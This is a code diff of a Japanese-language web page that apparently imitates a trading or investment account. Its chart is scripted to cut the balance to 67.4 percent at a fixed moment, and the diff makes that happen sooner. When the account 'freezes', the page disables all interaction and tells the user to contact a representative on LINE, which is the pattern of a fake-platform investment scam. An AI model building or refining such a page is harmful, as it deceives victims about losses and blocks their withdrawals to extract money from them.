@@ -79,7 +79,7 @@
             border-radius: 10px;
             display: none;
             box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-            cursor: pointer;
+            z-index: 1000; /* Ensure it appears on top */
         }
         .input-group {
             margin-bottom: 10px; /* Adjusted margin */
@@ -141,7 +141,7 @@
             <button onclick="confirmWithdraw()" id="withdrawBtn">出金</button>
         </div>
     </div>
-    <div id="freezeMessage" onclick="redirect()">口座が凍結しました</div>
+    <div id="freezeMessage">口座が凍結しました。担当者にLINEにてご連絡ください。</div>
     <div class="nav">
         <button onclick="showPage('page1')">チャート</button>
         <button onclick="showPage('page2')">口座</button>
@@ -213,7 +213,7 @@
         function freezeAccount() {
             const message = document.getElementById('freezeMessage');
             message.style.display = 'block';
-            disableButtons();
+            document.body.style.pointerEvents = 'none'; // Disable all interactions
         }
 
         function updateBalance() {
@@ -235,7 +235,7 @@
         function startChart(depositAmount) {
             const initialAmount = balance; // 口座の金額を初期値に設定
             const duration = 10; // seconds
-            const interval = 2; // seconds
+            const interval = 1; // seconds
             const steps = duration / interval;
             let currentAmount = initialAmount;
             
@@ -260,7 +260,7 @@
                     }
                 }
 
-                if (i * interval === 8) {
+                if (i * interval === 4) {
                     currentAmount = initialAmount * 0.674; // Set value at 45 seconds
                 }
 
@@ -326,10 +326,6 @@
                     step++;
                 }
             }, interval * 1000);
-        }
-
-        function redirect() {
-            window.location.href = "https://GITgorira/money-survey/"; // Redirect to desired URL
         }
 
         document.addEventListener('DOMContentLoaded', () => {
